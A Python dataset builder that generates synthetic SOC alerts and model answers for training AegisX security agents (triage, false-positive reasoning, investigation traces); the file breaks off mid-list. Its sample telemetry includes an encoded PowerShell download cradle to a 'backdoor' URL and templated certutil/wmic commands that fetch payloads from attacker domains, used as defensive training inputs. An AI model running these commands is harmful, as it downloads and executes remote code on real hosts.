"""
Cybersecurity Fine-Tuning Dataset Builder & Synthetic SOC Telemetry Engine.

Generates high-fidelity training datasets in ChatML and Alpaca formats for fine-tuning
open-source LLMs (Llama 3, Mistral, Qwen, DeepSeek) for AegisX's autonomous SOC agents:
  1. Triage Agent: Alert classification, severity scoring, MITRE technique tagging
  2. False-Positive Reasoning: Discerning legitimate sysadmin/developer actions from adversary TTPs
  3. Investigation Agent: ReAct evidence-collection loops calling AegisX read-only tools
  4. Attack Story Agent: Constructing chronological kill-chain narratives and entity graphs
  5. Response Agent: Prioritized, lab-safe containment and remediation action plans
  6. Threat Hunting Agent: Hypothesis-driven hunting queries (Splunk SPL, KQL, EQL)

Supported formats:
  - chatml: [{"role": "system", "content": ...}, {"role": "user", "content": ...}, {"role": "assistant", "content": ...}]
  - alpaca: {"instruction": ..., "input": ..., "output": ...}

Usage:
    python dataset_builder.py --seed --output-dir ml/datasets/processed --format chatml
    python dataset_builder.py --all --count 8000
    python dataset_builder.py --category triage --count 1500
"""
from __future__ import annotations

import argparse
import glob
import hashlib
import io
import json
import logging
import os
import random
import re
import sys
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

try:
    import yaml
except ImportError:
    yaml = None

try:
    import structlog
    log = structlog.get_logger()
except ImportError:
    logging.basicConfig(level=logging.INFO)
    _std_log = logging.getLogger("dataset_builder")
    class _LoggerWrapper:
        def info(self, msg, **kwargs):
            kw_str = " ".join(f"{k}={v}" for k, v in kwargs.items())
            _std_log.info(f"{msg} {kw_str}".strip())
        def warning(self, msg, **kwargs):
            kw_str = " ".join(f"{k}={v}" for k, v in kwargs.items())
            _std_log.warning(f"{msg} {kw_str}".strip())
        def error(self, msg, **kwargs):
            kw_str = " ".join(f"{k}={v}" for k, v in kwargs.items())
            _std_log.error(f"{msg} {kw_str}".strip())
    log = _LoggerWrapper()


# ── System Prompts for AegisX Autonomous SOC Agents ──────────────────────────

TRIAGE_SYSTEM_PROMPT = (
    "You are AegisX Triage Agent. Given a security alert and raw event telemetry, "
    "classify its severity (critical, high, medium, low, informational), assign MITRE ATT&CK techniques, "
    "estimate false positive probability, and determine if it requires investigation."
)

FP_REASONING_SYSTEM_PROMPT = (
    "You are AegisX False Positive Reasoning Agent. Your role is to deeply analyze security alerts "
    "against environmental context, user roles, parent-process trees, command-line arguments, and routine "
    "administrative activity to determine if an alert is a Benign True Positive, False Positive, or Malicious True Positive. "
    "Provide root cause analysis and detection rule tuning recommendations."
)

INVESTIGATION_SYSTEM_PROMPT = (
    "You are an AI security analyst performing an incident investigation.\n\n"
    "Your job:\n"
    "1. Reason about what happened based on available evidence.\n"
    "2. Identify what evidence is missing.\n"
    "3. Choose the BEST tool to gather missing evidence.\n"
    "4. Analyze the tool result.\n"
    "5. Update your hypothesis.\n"
    "6. Decide: do you need more evidence, or do you have enough to conclude?\n\n"
    "Available tools (call by name):\n"
    "- search_endpoint_events(host, event_type, limit)\n"
    "- search_process_tree(host, process_name)\n"
    "- search_network_events(host, src_ip, dst_ip, limit)\n"
    "- search_user_activity(username, host, limit)\n"
    "- lookup_ip(ip)\n"
    "- lookup_domain(domain)\n"
    "- lookup_hash(hash_value)\n"
    "- search_mitre_technique(technique_id)\n\n"
    "Rules:\n"
    "- NEVER invent tool results. Only use what the tool returns.\n"
    "- NEVER call a write/response tool. You are read-only.\n"
    "- Output ONLY valid JSON for each reasoning step.\n"
    "- Stop when you have enough evidence to form a conclusion."
)

ATTACK_STORY_SYSTEM_PROMPT = (
    "You are AegisX Attack Story Agent. Given correlated incident evidence, alerts, entities, and telemetry, "
    "produce:\n"
    "1. A concise executive summary explaining what occurred, who was affected, and threat actor objectives.\n"
    "2. An ordered attack timeline of stages mapped to MITRE ATT&CK tactics.\n"
    "3. Entity relationships (hosts, users, external IPs, processes).\n"
    "4. Impact assessment and root cause."
)

RESPONSE_SYSTEM_PROMPT = (
    "You are AegisX Response Agent. Given an investigated incident, recommend prioritized, lab-safe containment "
    "and remediation actions with clear justification. All destructive or isolation actions must require human approval. "
    "Adhere strictly to the response action catalog: isolate_endpoint, kill_process, quarantine_file, block_ip, "
    "disable_account, reset_password."
)

HUNTING_SYSTEM_PROMPT = (
    "You are AegisX Threat Hunting Agent. Given a MITRE ATT&CK technique or threat intelligence hypothesis, "
    "generate a structured threat hunt plan including: hypothesis description, environmental baseline criteria, "
    "anomalous behavior detection logic, and executable hunting queries in Splunk SPL, Microsoft Sentinel KQL, and Elastic EQL."
)


# ── Seed Training Templates (Preserved for 100% Backward Compatibility) ───────

SEED_SAMPLES: List[Dict[str, Any]] = [
    # ── 1. Triage Agent ───────────────────────────────────────────────────────
    {
        "agent": "triage",
        "system": TRIAGE_SYSTEM_PROMPT,
        "user": json.dumps({
            "alert_id": "ALT-F9812A",
            "title": "Office Application Spawns Scripting Host",
            "event": {
                "host": "LAB-WIN-01",
                "user": "victim_user",
                "process": "powershell.exe",
                "parent_process": "winword.exe",
                "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADQANAA0ADQALwBiAGEAYwBrAGQAbwBvAHIAJwApAA==",
            }
        }, indent=2),
        "assistant": json.dumps({
            "severity": "critical",
            "confidence": 0.96,
            "requires_investigation": True,
            "mitre_techniques": ["T1566.001", "T1059.001", "T1027"],
            "triage_summary": "Microsoft Word spawned PowerShell executing a base64-encoded download cradle reaching out to an external C2 IP on port 4444. High probability of malicious macro execution.",
            "recommended_priority": "P1_IMMEDIATE"
        }, indent=2)
    },
    {
        "agent": "triage",
        "system": TRIAGE_SYSTEM_PROMPT,
        "user": json.dumps({
            "alert_id": "ALT-3388DC",
            "title": "Multiple Failed SSH Logins",
            "event": {
                "host": "srv-prod-db01",
                "user": "root",
                "src_ip": "203.0.113.42",
                "dst_port": 22,
                "event_type": "user_logon_failed",
                "attempt_count": 48
            }
        }, indent=2),
        "assistant": json.dumps({
            "severity": "high",
            "confidence": 0.91,
            "requires_investigation": True,
            "mitre_techniques": ["T1110.001"],
            "triage_summary": "48 rapid failed SSH authentication attempts for user 'root' originating from external IP 203.0.113.42. Strong brute force / credential guessing indicator.",
            "recommended_priority": "P2_HIGH"
        }, indent=2)
    },

    # ── 2. Investigation Agent ────────────────────────────────────────────────
    {
        "agent": "investigation",
        "system": INVESTIGATION_SYSTEM_PROMPT,
        "user": json.dumps({
            "incident_id": "INC-2041",
            "hypothesis": "Host LAB-WIN-01 compromised via malicious document. Need to verify child processes and network persistence.",
            "evidence_so_far": [
                {"tool": "search_endpoint_events", "result": "Found winword.exe spawning powershell.exe"}
            ]
        }, indent=2),
        "assistant": json.dumps({
            "thought": "I need to inspect the full parent-child process tree on LAB-WIN-01 to see what commands were executed by PowerShell.",
            "next_tool": "search_process_tree",
            "tool_args": {"host": "LAB-WIN-01", "process_name": "powershell.exe"},
            "done": False
        }, indent=2)
    },
    {
        "agent": "investigation",
        "system": INVESTIGATION_SYSTEM_PROMPT,
        "user": json.dumps({
            "incident_id": "INC-2041",
            "hypothesis": "PowerShell connected to IP 185.220.101.5. Checking external threat reputation.",
            "evidence_so_far": [
                {"tool": "search_network_events", "result": "Connected to 185.220.101.5:4444 (14.2 KB sent)"}
            ]
        }, indent=2),
        "assistant": json.dumps({
            "thought": "I should query threat intelligence to verify if 185.220.101.5 is a known Cobalt Strike / Metasploit C2 node.",
            "next_tool": "lookup_ip",
            "tool_args": {"ip": "185.220.101.5"},
            "done": False
        }, indent=2)
    },

    # ── 3. Attack Story Agent ─────────────────────────────────────────────────
    {
        "agent": "attack_story",
        "system": ATTACK_STORY_SYSTEM_PROMPT,
        "user": json.dumps({
            "incident_id": "INC-2041",
            "risk_score": 88,
            "entities": {"hosts": ["LAB-WIN-01"], "users": ["victim_user"], "ips": ["185.220.101.5"]},
            "timeline": [
                {"time": "12:00:00", "tactic": "Initial Access", "event": "Word doc opened from email"},
                {"time": "12:00:04", "tactic": "Execution", "event": "PowerShell launched with base64 encoded payload"},
                {"time": "12:00:19", "tactic": "Command and Control", "event": "Outbound TCP connection to 185.220.101.5:4444 established"}
            ]
        }, indent=2),
        "assistant": json.dumps({
            "executive_summary": "On August 29, host LAB-WIN-01 was compromised through a phishing email carrying a weaponized Microsoft Word document. Upon opening, an embedded macro spawned an encoded PowerShell script that established persistent Command & Control communication with external server 185.220.101.5 over port 4444.",
            "kill_chain_phases": [
                {"phase": "Initial Access", "technique": "T1566.001", "details": "Phishing attachment delivered malicious document."},
                {"phase": "Execution", "technique": "T1059.001", "details": "PowerShell command execution."},
                {"phase": "Defense Evasion", "technique": "T1027", "details": "Base64 payload encoding."},
                {"phase": "Command and Control", "technique": "T1571", "details": "Non-standard port 4444 C2 beaconing."}
            ],
            "impact_assessment": "Critical. Active C2 connection allows arbitrary remote command execution and credential dumping."
        }, indent=2)
    },

    # ── 4. Response Agent ─────────────────────────────────────────────────────
    {
        "agent": "response",
        "system": RESPONSE_SYSTEM_PROMPT,
        "user": json.dumps({
            "incident_id": "INC-2041",
            "threat_summary": "Active C2 beaconing from LAB-WIN-01 to 185.220.101.5 via powershell.exe",
            "host": "LAB-WIN-01",
            "dst_ip": "185.220.101.5"
        }, indent=2),
        "assistant": json.dumps({
            "recommendations": [
                {
                    "priority": 1,
                    "action": "isolate_endpoint",
                    "target": "LAB-WIN-01",
                    "reason": "Prevent lateral movement and immediate C2 beaconing.",
                    "expected_impact": "Host disconnected from local subnet; management traffic retained.",
                    "risk_level": "medium",
                    "reversible": True,
                    "requires_human_approval": True
                },
                {
                    "priority": 2,
                    "action": "block_firewall_ip",
                    "target": "185.220.101.5",
                    "reason": "Block perimeter outbound traffic to confirmed attacker C2 server.",
                    "expected_impact": "Network boundary firewall rule added.",
                    "risk_level": "low",
                    "reversible": True,
                    "requires_human_approval": True
                },
                {
                    "priority": 3,
                    "action": "kill_process",
                    "target": "LAB-WIN-01:powershell.exe",
                    "reason": "Terminate attacker reverse shell process.",
                    "expected_impact": "Suspicious PowerShell process terminated.",
                    "risk_level": "low",
                    "reversible": False,
                    "requires_human_approval": True
                }
            ]
        }, indent=2)
    }
]


# ── Synthetic Data Generation Helpers ────────────────────────────────────────

ENT_HOSTS = [
    "WKSTN-FIN-014", "SRV-DC-01", "APP-PROD-WEB02", "DEV-LNX-09", "CORP-EXCH-01",
    "FINANCE-DB-02", "HR-LAPTOP-108", "OPS-JUMP-01", "BACKUP-NAS-03", "SEC-EDR-SRV",
    "LAB-WIN-01", "LAB-WIN-02", "WS-MKTG-07", "PROD-K8S-NODE3", "VPN-GW-EXT"
]

ENT_USERS = [
    "jdoe", "asmith", "svc_backup", "svc_sccm", "svc_ansible", "admin_net",
    "svc_nessus", "dev_user", "ciso_exec", "billing_clerk", "cloud_admin",
    "db_maintainer", "temp_contractor", "secops_analyst", "root"
]

ATTACKER_IPS = [
    "185.220.101.5", "194.26.29.112", "45.142.214.8", "91.240.118.172",
    "104.244.76.13", "198.51.100.45", "193.106.191.22", "185.176.27.114",
    "89.208.107.19", "179.43.155.22", "45.154.255.88", "194.36.191.10"
]

ATTACKER_DOMAINS = [
    "cdn-telemetry-update.com", "auth-sso-verify.net", "windows-defender-cloud.org",
    "global-cdn-cache.xyz", "ms-update-service.info", "onedrive-share-direct.link",
    "secure-login-portal.top", "edge-telemetry-sync.cc", "adfs-identity-sts.co"
]

COMMON_HASHES = [
    "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "f1d2d2f924e986ac86fdf7b36c94bcdf32beec15f74e9ced82737ec736fbaebd",
    "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
    "8f448de0b865582f6e077c5932a9e523f1f33ab03fb6d16ca8a06bda04e29404",
    "3f057864f1e3a6a70e75a9ff9f4384a8497fa9fb3a7587848ff47e6ff8a0f9a2"
]


# ── Dataset Builder Class ─────────────────────────────────────────────────────

class DatasetBuilder:
    """Extracts, formats, generates synthetic telemetry, and partitions cybersecurity fine-tuning datasets."""

    def __init__(self, output_dir: str = "ml/datasets/processed", format_type: str = "chatml"):
        self.output_dir = Path(output_dir)
        self.format_type = format_type.lower()
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._sigma_rules_cache = None
        self._attck_tech_cache = None

    def format_sample(self, raw: Dict[str, Any]) -> Dict[str, Any]:
        """Convert sample dict into specified format (chatml / alpaca)."""
        system = raw.get("system", "You are AegisX Cybersecurity Assistant.")
        user = raw.get("user", "")
        assistant = raw.get("assistant", "")

        if self.format_type == "chatml":
            return {
                "messages": [
                    {"role": "system", "content": system},
                    {"role": "user", "content": user},
                    {"role": "assistant", "content": assistant},
                ]
            }
        else:  # alpaca format
            return {
                "instruction": system,
                "input": user,
                "output": assistant,
            }

    def generate_seed_data(self, multiplier: int = 5) -> List[Dict[str, Any]]:
        """Generate expanded synthetic seed dataset covering all agent capabilities."""
        dataset = []
        for _ in range(multiplier):
            for sample in SEED_SAMPLES:
                dataset.append(self.format_sample(sample))
        random.seed(42)
        random.shuffle(dataset)
        return dataset

    def save_splits(
        self,
        records: List[Dict[str, Any]],
        train_ratio: float = 0.8,
        val_ratio: float = 0.1,
        test_ratio: float = 0.1,
        prefix: str = "",
    ) -> Dict[str, int]:
        """Split dataset and save train.jsonl, val.jsonl, test.jsonl (with optional prefix)."""
        total = len(records)
        if total == 0:
            return {"train": 0, "val": 0, "test": 0}

        train_end = max(1, int(total * train_ratio))
        val_end = min(total, train_end + max(1, int(total * val_ratio)))

        train_data = records[:train_end]
        val_data = records[train_end:val_end]
        test_data = records[val_end:] if val_end < total else records[train_end:val_end]

        pfx = f"{prefix}_" if prefix else ""
        files = {
            "train": (self.output_dir / f"{pfx}train.jsonl", train_data),
            "val": (self.output_dir / f"{pfx}val.jsonl", val_data),
            "test": (self.output_dir / f"{pfx}test.jsonl", test_data),
        }

        counts = {}
        for split_name, (fpath, data) in files.items():
            with open(fpath, "w", encoding="utf-8") as f:
                for row in data:
                    f.write(json.dumps(row, ensure_ascii=False) + "\n")
            counts[split_name] = len(data)

        info = {
            "dataset_name": f"AegisX-SOC-{prefix or 'Combined'}",
            "format": self.format_type,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "total_samples": total,
            "splits": counts,
        }

        info_path = self.output_dir / f"{pfx}dataset_info.json" if prefix else self.output_dir / "dataset_info.json"
        with open(info_path, "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2)

        log.info("Dataset saved successfully", **counts, output_dir=str(self.output_dir))
        return counts

    # ── Synthetic Dataset Generators ──────────────────────────────────────────

    def _get_base_dirs(self) -> Tuple[Path, Path]:
        """Locate SOC root and datasets directory reliably."""
        cur = Path(__file__).resolve()
        # Navigate upward until we find 'datasets' or 'aegisx'
        soc_root = None
        for parent in [cur] + list(cur.parents):
            if (parent / "datasets").exists() and (parent / "aegisx").exists():
                soc_root = parent
                break
            if parent.name.lower() in ("soc", "desktop"):
                soc_root = parent
                break
        if soc_root is None:
            soc_root = Path.cwd()

        datasets_dir = soc_root / "datasets" if (soc_root / "datasets").exists() else Path("datasets")
        return soc_root, datasets_dir

    def _load_sigma_rules(self) -> List[Dict[str, Any]]:
        """Load and cache parsed Sigma rules."""
        if self._sigma_rules_cache is not None:
            return self._sigma_rules_cache

        _, datasets_dir = self._get_base_dirs()
        sigma_glob = datasets_dir / "sigma_rules" / "sigma" / "rules" / "windows" / "**" / "*.yml"
        rule_files = glob.glob(str(sigma_glob), recursive=True)
        rules = []

        if yaml is not None:
            for rf in rule_files[:800]:  # sample a diverse set
                try:
                    with open(rf, "r", encoding="utf-8", errors="ignore") as f:
                        data = yaml.safe_load(f)
                        if isinstance(data, dict) and data.get("title"):
                            tags = data.get("tags", []) or []
                            techs = [t.replace("attack.", "").upper() for t in tags if "attack.t" in str(t).lower()]
                            rules.append({
                                "title": data.get("title", "Unknown Rule"),
                                "description": data.get("description", "Suspicious endpoint activity detected."),
                                "level": data.get("level", "medium"),
                                "tags": techs or ["T1059.001"],
                                "falsepositives": data.get("falsepositives", []) or [],
                                "logsource": data.get("logsource", {}),
                            })
                except Exception:
                    continue

        self._sigma_rules_cache = rules
        return rules

    def _load_attck_techniques(self) -> List[Dict[str, Any]]:
        """Load and cache ATT&CK techniques."""
        if self._attck_tech_cache is not None:
            return self._attck_tech_cache

        _, datasets_dir = self._get_base_dirs()
        tech_file = datasets_dir / "nlp_datasets" / "huggingface_security" / "attck_enterprise_techniques.json"
        techs = []
        if tech_file.exists():
            try:
                with open(tech_file, "r", encoding="utf-8") as f:
                    techs = json.load(f)
            except Exception:
                pass

        self._attck_tech_cache = techs
        return techs

    # 1. Triage Agent Classification
    def generate_synthetic_triage(self, count: int = 1500) -> List[Dict[str, Any]]:
        """Generate synthetic triage classification samples based on detection rules and threat telemetry."""
        rules = self._load_sigma_rules()
        samples = []
        rnd = random.Random(101)

        triage_scenarios = [
            ("Process Execution", "process_created", ["powershell.exe", "cmd.exe", "wscript.exe", "mshta.exe", "rundll32.exe"], "T1059.001"),
            ("Credential Dumping", "process_access", ["lsass.exe", "sam.exe", "mimikatz.exe", "nanodump.exe"], "T1003.001"),
            ("Persistence Setup", "registry_event", ["reg.exe", "schtasks.exe", "sc.exe"], "T1547.001"),
            ("Defense Impairment", "process_created", ["vssadmin.exe", "bcdedit.exe", "net.exe"], "T1490"),
            ("Lateral Movement", "network_connection", ["wmic.exe", "psexec.exe", "smbclient"], "T1021.002"),
            ("C2 Beaconing", "network_connection", ["curl.exe", "certutil.exe", "powershell.exe"], "T1571"),
            ("Cloud Privilege Escalation", "cloud_audit", ["aws-cli", "gcloud", "az"], "T1078.004"),
        ]

        for i in range(count):
            host = rnd.choice(ENT_HOSTS)
            user = rnd.choice(ENT_USERS)
            ip = rnd.choice(ATTACKER_IPS)
            domain = rnd.choice(ATTACKER_DOMAINS)
            sha = rnd.choice(COMMON_HASHES)
            ts = (datetime.now(timezone.utc) - timedelta(minutes=rnd.randint(1, 14400))).isoformat()

            if rules and rnd.random() < 0.65:
                r = rnd.choice(rules)
                title = r["title"]
                desc = r["description"]
                techs = r["tags"] or ["T1059.001"]
                sev = r["level"] if r["level"] in ("critical", "high", "medium", "low") else "medium"
            else:
                cat_name, ev_type, procs, default_tech = rnd.choice(triage_scenarios)
                proc = rnd.choice(procs)
                title = f"Suspicious {cat_name}: {proc} Activity"
                desc = f"Unusual execution of {proc} initiated on host {host} by account {user}."
                techs = [default_tech]
                sev = rnd.choice(["critical", "high", "medium"])

            is_malicious = sev in ("critical", "high") or (sev == "medium" and rnd.random() > 0.4)
            classification = "malicious" if is_malicious else ("suspicious" if sev == "medium" else "benign")
            fp_prob = round(rnd.uniform(0.02, 0.15) if is_malicious else rnd.uniform(0.40, 0.85), 2)
            confidence = round(rnd.uniform(0.88, 0.98), 2)
            priority = "P1_IMMEDIATE" if sev == "critical" else ("P2_HIGH" if sev == "high" else "P3_MEDIUM")

            alert_payload = {
                "alert_id": f"ALT-{rnd.randint(100000, 999999):X}",
                "timestamp": ts,
                "title": title,
                "severity": sev,
                "event": {
                    "host": host,
                    "user": user,
                    "process": rnd.choice(["powershell.exe", "cmd.exe", "mshta.exe", "wmic.exe", "rundll32.exe"]),
                    "parent_process": rnd.choice(["explorer.exe", "winword.exe", "excel.exe", "services.exe", "svchost.exe"]),
                    "command_line": f"{rnd.choice(['powershell.exe -enc', 'cmd.exe /c', 'certutil.exe -urlcache -split -f', 'wmic process call create'])} http://{domain}/{rnd.choice(['payload.bin', 'update.ps1', 'beacon.dll'])}",
                    "destination_ip": ip,
                    "destination_port": rnd.choice([4444, 8080, 8443, 443, 9001]),
                    "file_hash": sha,
                },
                "detection_context": desc
            }

            assistant_payload = {
                "classification": classification,
                "severity": sev,
                "confidence": confidence,
                "false_positive_probability": fp_prob,
                "investigation_required": is_malicious or classification == "suspicious",
                "mitre_techniques": techs[:3],
                "triage_summary": (
                    f"Alert '{title}' on host {host} initiated by user '{user}'. "
                    f"Process spawned with network connection to {ip} ({domain}). "
                    f"Behavior aligns with MITRE {', '.join(techs[:3])}. "
                    f"{'Requires urgent SOC investigation.' if is_malicious else 'Potential benign activity, verification advised.'}"
                ),
                "recommended_priority": priority
            }

            samples.append(self.format_sample({
                "agent": "triage",
                "system": TRIAGE_SYSTEM_PROMPT,
                "user": json.dumps(alert_payload, indent=2),
                "assistant": json.dumps(assistant_payload, indent=2)
            }))

        return samples

    # 2. False Positive Reasoning Agent
    def generate_synthetic_false_positive_reasoning(self, count: int = 1500) -> List[Dict[str, Any]]:
        """Generate high-quality false-positive vs true-positive reasoning pairs."""
        rules = self._load_sigma_rules()
        rules_with_fps = [r for r in rules if r.get("falsepositives")]
        samples = []
        rnd = random.Random(202)

        fp_scenarios = [
            {
                "tool": "SCCM / Microsoft Configuration Manager",
                "user": "svc_sccm",
                "process": "powershell.exe",
                "parent": "CcmExec.exe",
                "cmd": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\ScriptStore\\DiscoveryInventory.ps1",
                "reason": "Legitimate enterprise asset discovery script executed by SCCM service daemon.",
                "tuning": "Exclude parent process CcmExec.exe executing signed scripts from C:\\Windows\\CCM\\ScriptStore\\."
            },
            {
                "tool": "Veeam Backup & Replication",
                "user": "svc_backup",
                "process": "vssadmin.exe",
                "parent": "VeeamDeploymentSvc.exe",
                "cmd": "vssadmin.exe create shadow /for=C:",
                "reason": "Veeam scheduled nightly snapshot creation for enterprise virtual machine backup.",
                "tuning": "Filter out VSS shadow creation events originating from parent VeeamDeploymentSvc.exe."
            },
            {
                "tool": "Lansweeper Network Audit",
                "user": "svc_ansible",
                "process": "wmic.exe",
                "parent": "LansweeperService.exe",
                "cmd": "wmic.exe /node:10.0.4.14 computersystem get manufacturer,model,name",
                "reason": "Routine agentless hardware discovery scan from central IT asset management appliance.",
                "tuning": "Whitelist Lansweeper management server IP 10.0.4.10 for remote WMI inventory queries."
            },
            {
                "tool": "Active Directory Certificate Enrollment",
                "user": "svc_adcert",
                "process": "certutil.exe",
                "parent": "taskhostw.exe",
                "cmd": "certutil.exe -pulse",
                "reason": "Automated machine certificate renewal triggered by Group Policy auto-enrollment task.",
                "tuning": "Allow certutil.exe with arguments '-pulse' invoked by system taskhostw.exe."
            },
            {
                "tool": "Nessus Vulnerability Scanner",
                "user": "svc_nessus",
                "process": "nmap.exe",
                "parent": "nessusd.exe",
                "cmd": "nmap.exe -sS -p 22,80,443,3389 10.0.4.0/24",
                "reason": "Authorized weekly vulnerability scan conducted by enterprise SecOps team.",
                "tuning": "Silence network port scan alerts when source IP matches approved Nessus scanner 10.0.4.25."
            },
            {
                "tool": "Developer Compilation & Test Harness",
                "user": "dev_user",
                "process": "cmd.exe",
                "parent": "code.exe",
                "cmd": "cmd.exe /c npm run test:e2e && python -m pytest tests/",
                "reason": "Local unit and integration test suite execution inside VS Code developer workstation.",
                "tuning": "Scope rule to exclude developer workstations or filter parent code.exe running test commands."
            },
            {
                "tool": "Splunk Universal Forwarder Telemetry",
                "user": "SYSTEM",
                "process": "powershell.exe",
                "parent": "splunkd.exe",
                "cmd": "powershell.exe -command Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}",
                "reason": "Splunk scripted input gathering network listening socket metrics for SIEM ingestion.",
                "tuning": "Exclude PowerShell commands matching Splunk input scripts launched by splunkd.exe."
            }
        ]

        for i in range(count):
            host = rnd.choice(ENT_HOSTS)
            is_fp = rnd.random() < 0.60  # 60% false positives, 40% true positives

            if is_fp:
                scen = rnd.choice(fp_scenarios)
                alert_input = {
                    "alert_id": f"FP-ALT-{rnd.randint(100000, 999999):X}",
                    "rule_name": f"Suspicious Execution via {scen['process']}",
                    "host": host,
                    "account": scen["user"],
                    "parent_process": scen["parent"],
                    "process": scen["process"],
                    "command_line": scen["cmd"],
                    "environment_context": f"Dedicated enterprise asset; service account active during maintenance window."
                }
                assistant_resp = {
                    "verdict": "false_positive",
                    "confidence": round(rnd.uniform(0.92, 0.99), 2),
                    "root_cause": scen["reason"],
                    "key_indicators_analyzed": {
                        "user_context": f"Account '{scen['user']}' is a designated service/operational identity.",
                        "parent_process_chain": f"{scen['parent']} -> {scen['process']}",
                        "command_line_intent": f"Parameters indicate administrative maintenance/inventory rather than weaponized execution.",
                        "network_behavior": "No unusual outbound external C2 traffic observed."
                    },
                    "tuning_recommendation": scen["tuning"],
                    "investigation_required": False
                }
            else:
                # True Positive counterpart
                ext_ip = rnd.choice(ATTACKER_IPS)
                ext_dom = rnd.choice(ATTACKER_DOMAINS)
                proc = rnd.choice(["powershell.exe", "certutil.exe", "vssadmin.exe", "wmic.exe"])
                alert_input = {
                    "alert_id": f"TP-ALT-{rnd.randint(100000, 999999):X}",
                    "rule_name": f"Adversary Living-off-the-Land: {proc}",
                    "host": host,
                    "account": rnd.choice(["jdoe", "asmith", "victim_user"]),
                    "parent_process": rnd.choice(["winword.exe", "excel.exe", "outlook.exe"]),
                    "process": proc,
                    "command_line": f"{proc} -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ... -urlcache http://{ext_dom}/stage.bin",
                    "environment_context": "Standard user desktop; process spawned outside authorized administrative channels."
                }
                assistant_resp = {
                    "verdict": "malicious_true_positive",
                    "confidence": round(rnd.uniform(0.95, 0.99), 2),
                    "root_cause": "Adversary executing Living-off-the-Land binary (LOLBin) spawned directly from Microsoft Office.",
                    "key_indicators_analyzed": {
                        "user_context": "Standard enterprise user without administrative scripting privileges.",
                        "parent_process_chain": f"{alert_input['parent_process']} -> {proc} (abnormal parent-child relationship)",
                        "command_line_intent": f"Obfuscated encoded command downloading external payload from {ext_dom} ({ext_ip}).",
                        "network_behavior": f"Outbound connection initiated to known threat infrastructure {ext_ip}."
                    },
                    "tuning_recommendation": "Do NOT exclude. Maintain high-severity alert for Office applications spawning scripting interpreters.",
                    "investigation_required": True
                }

            samples.append(self.format_sample({
                "agent": "false_positive_reasoning",
                "system": FP_REASONING_SYSTEM_PROMPT,
                "user": json.dumps(alert_input, indent=2),
                "assistant": json.dumps(assistant_resp, indent=2)
            }))

        return samples

    # 3. Investigation Agent ReAct Traces
    def generate_synthetic_investigation_traces(self, count: int = 1500) -> List[Dict[str, Any]]:
        """Generate multi-step investigation ReAct reasoning traces."""
        samples = []
        rnd = random.Random(303)

        investigation_chains = [
            {
                "type": "Phishing Macro & Reverse Shell",
                "steps": [
                    {
                        "thought": "Initial alert indicates Word spawned PowerShell. I need to inspect the process tree on the endpoint to see what child commands were executed.",
                        "tool": "search_process_tree",
                        "args": {"host": "{host}", "process_name": "powershell.exe"},
                        "result": "Process tree: explorer.exe -> winword.exe -> powershell.exe -> whoami.exe, net.exe",
                        "done": False,
                    },
                    {
                        "thought": "PowerShell executed discovery commands. Now checking outbound network telemetry to identify any active C2 beaconing.",
                        "tool": "search_network_events",
                        "args": {"host": "{host}", "src_ip": "{internal_ip}", "limit": 10},
                        "result": "Outbound TCP connection established from powershell.exe to {c2_ip}:4444 (18.4 KB sent).",
                        "done": False,
                    },
                    {
                        "thought": "An outbound connection to {c2_ip} on port 4444 was confirmed. Let me query threat intelligence to verify reputation.",
                        "tool": "lookup_ip",
                        "args": {"ip": "{c2_ip}"},
                        "result": "Threat Intel Report: IP {c2_ip} is an active Cobalt Strike Team Server node hosted on bulletproof provider.",
                        "done": False,
                    },
                    {
                        "thought": "We have confirmed malicious macro execution, local reconnaissance, and active C2 communication. Evidence is sufficient to conclude.",
                        "tool": None,
                        "args": {},
                        "result": None,
                        "done": True,
                        "conclusion": "Confirmed high-severity compromise of {host}. Attacker gained initial access via weaponized document and established Cobalt Strike beacon to {c2_ip}. Immediate endpoint containment required."
                    }
                ]
            },
            {
                "type": "Credential Dumping via LSASS Access",
                "steps": [
                    {
                        "thought": "Alert flags abnormal handle request to LSASS process memory. Inspecting endpoint events for suspicious processes accessing lsass.exe.",
                        "tool": "search_endpoint_events",
                        "args": {"host": "{host}", "event_type": "process_access", "limit": 10},
                        "result": "rundll32.exe requested PROCESS_ALL_ACCESS (0x1FFFFF) permissions to lsass.exe (PID 672).",
                        "done": False,
                    },
                    {
                        "thought": "Need to determine which user account ran rundll32.exe and verify authentication logs for lateral movement.",
                        "tool": "search_user_activity",
                        "args": {"username": "{user}", "host": "{host}", "limit": 5},
                        "result": "User {user} logged in via remote SMB (Type 3 logon) from source workstation 10.0.4.15.",
                        "done": False,
                    },
                    {
                        "thought": "Checking file hash of dropped dump artifact to evaluate malware signature.",
                        "tool": "lookup_hash",
                        "args": {"hash_value": "{hash}"},
                        "result": "Hash matches known procdump / comsvcs.dll LSASS memory dumper artifact.",
                        "done": False,
                    },
                    {
                        "thought": "Evidence confirms credential dumping via comsvcs minidump technique from remote source. Investigation complete.",
                        "tool": None,
                        "args": {},
                        "result": None,
                        "done": True,
                        "conclusion": "Adversary performed LSASS credential extraction on {host} using comsvcs.dll minidump via compromised account {user}. Immediate credential revocation and host isolation recommended."
                    }
                ]
            },
            {
                "type": "Cloud Identity Compromise & Privilege Escalation",
                "steps": [
                    {
                        "thought": "Unusual cloud console authentication from external geographic location. Checking user activity across identity provider logs.",
                        "tool": "search_user_activity",
                        "args": {"username": "{user}", "host": "okta.enterprise.com", "limit": 10},
                        "result": "User {user} logged in from {c2_ip} (AS-Bulgaria) bypassing MFA via session cookie hijacking.",
                        "done": False,
                    },
                    {
